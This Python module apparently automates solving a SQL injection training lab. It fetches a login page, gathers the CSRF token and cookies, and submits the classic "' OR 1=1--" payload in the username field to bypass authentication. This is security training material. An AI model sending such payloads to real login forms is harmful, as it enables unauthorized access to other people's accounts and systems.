import random
import string
import sys
from halo import Halo

from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class LoginBypassSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)
        self.path_login = "/login"
        self.password = None

    def solve(self):
        """Solve the lab."""
        spinner = Halo(text='Starting attack on Login Bypass', spinner='dots')
        spinner.start()
        self.url += self.path_login
        spinner.text = 'Request Login Page'
        self._request_lab('GET')
        self.set_cookies()
        spinner.stop()
        spinner.start()
        spinner.text = 'Parsing the CSRF'
        spinner.text = 'Setting the username'
        spinner.text = 'Setting the password'
        spinner.text = 'Building the payload'
        self.custom_payload()
        spinner.stop()
        sys.stdout.flush()
        self._print_payload(self.payload)
        spinner.start()
        spinner.text = 'Sending the payload'
        spinner.stop()
        self._request_lab('POST', data=self.body_form, cookies=self.cookies, allow_redirects=False)
        self.print_session()
        self._print_solved()
    
    def custom_payload(self):
        """Build the payload."""
        self.set_password()
        self.set_csrf()
        self.set_cookies()
        self.payload = f"{self.username}' OR 1=1--"
        self.body_form = {
            'csrf': self.csrf,
            'username': self.payload,
            'password': self.password
        }
    
    def set_password(self):
        """Set the password."""
        self.password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))



    
        